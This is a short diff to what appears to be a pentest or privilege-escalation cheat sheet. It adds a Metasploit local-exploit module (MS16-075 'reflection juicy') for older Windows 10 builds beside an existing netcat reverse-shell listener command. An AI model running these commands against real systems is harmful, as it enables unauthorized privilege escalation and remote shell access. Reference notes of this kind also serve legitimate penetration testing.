@@ -82,3 +82,8 @@ ATTACKER MACHINE
 nc -lvpn 1234
 ```
 
+### WINDOWS 10 before build 17134 (tested on 14393)
+
+```
+use windows/local/ms16_075_reflection_juicy
+```
